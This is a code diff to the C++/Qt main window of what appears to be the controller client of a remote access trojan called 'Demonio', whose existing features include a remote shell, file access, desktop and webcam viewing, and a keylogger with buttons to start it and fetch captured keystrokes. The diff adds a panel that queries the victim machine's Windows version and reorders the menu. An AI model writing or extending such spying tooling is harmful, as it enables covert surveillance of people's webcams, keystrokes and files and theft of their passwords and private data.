@@ -58,6 +58,7 @@ MainWindow::MainWindow ( QWidget *parent ) :
   layoutPrincipal = new QGridLayout ( ui->centralWidget );
   layoutPrincipal->addWidget ( ui->listaOpciones );
   layoutPrincipal->addWidget ( ui->frameConexion,0,1 );
+  layoutPrincipal->addWidget ( ui->frameInformacion,0,1 );
   layoutPrincipal->addWidget ( ui->frameArchivos,0,1 );
   layoutPrincipal->addWidget ( ui->frameLicencia,0,1 );
   layoutPrincipal->addWidget ( ui->frameShellRemota,0,1 );
@@ -106,6 +107,7 @@ MainWindow::MainWindow ( QWidget *parent ) :
   connect (ui->botonDesactivarKeylogger,SIGNAL(clicked()),this,SLOT(desactivarKey()));
   connect (ui->botonRecibirTeclas,SIGNAL(clicked()),this,SLOT(recibirKey()));
   connect (ui->botonLimpiarLog,SIGNAL(clicked()),this,SLOT(limpiarKey()));
+  connect (ui->botonInformacion,SIGNAL(clicked()),this,SLOT(pedirInformacion()));
 }
 
 MainWindow::~MainWindow()
@@ -140,6 +142,7 @@ bool MainWindow::event(QEvent *event)
 void MainWindow::esconderFrames()
 {
   ui->frameConexion->hide();
+  ui->frameInformacion->hide();
   ui->frameShellRemota->hide();
   ui->frameArchivos->hide();
   ui->frameLicencia->hide();
@@ -162,35 +165,44 @@ void MainWindow::listaOpciones()
     }
     case ( 1 ) :
     {
-      ui->frameShellRemota->show();
+      ui->frameInformacion->show();
       break;
     }
     case ( 2 ) :
     {
-      ui->frameArchivos->show();
+      ui->frameShellRemota->show();
       break;
     }
     case ( 3 ) :
     {
-      ui->frameEscritorio->show();
+      ui->frameArchivos->show();
       break;
     }
     case ( 4 ) :
     {
-      ui->frameWebcam->show();
+      ui->frameEscritorio->show();
       break;
     }
     case ( 5 ) :
     {
-      ui->frameKeylogger->show();
+      ui->frameWebcam->show();
       break;
     }
     case ( 6 ) :
+    {
+      ui->frameKeylogger->show();
+      break;
+    }
+    case ( 7 ) :
     {
       ui->frameMensajes->show();
       break;
     }
     case ( 8 ) :
+    {
+        break;
+    }
+    case ( 9 ) :
     {
         ui->frameChat->show();
         break;
@@ -315,6 +327,31 @@ void MainWindow::llegadaDatos() /** llegada de datos; **/
   {
     this->alias = parametros[1];
     this->setWindowTitle("Demonio - Cliente - Conectado a: " + this->alias);
+  }
+  if (parametros[0] == "version")
+  {
+    int version;
+    version = parametros[1].toInt();
+    switch (version)
+    {
+    case QSysInfo::WV_XP: {
+        ui->informacionSistemaTexto->setText("Windows XP");
+        break;
+    }
+    case QSysInfo::WV_2003: {
+        ui->informacionSistemaTexto->setText("windows server");
+        break;
+    }
+    case QSysInfo::WV_VISTA: {
+        ui->informacionSistemaTexto->setText("windows VISTA");
+        break;
+    }
+    case QSysInfo::WV_WINDOWS7: {
+        ui->informacionSistemaTexto->setText("windows 7");
+        break;
+    }
+
+    }
   }
 }
 void MainWindow::seleccionarServidor()
@@ -555,4 +592,8 @@ void MainWindow::recibirKey()
 void MainWindow::limpiarKey()
 {
     util.escribirSocket("limpiark|@|",socket[activo]);
+}
+void MainWindow::pedirInformacion()
+{
+    util.escribirSocket("informacion|@|",socket[activo]);
 }
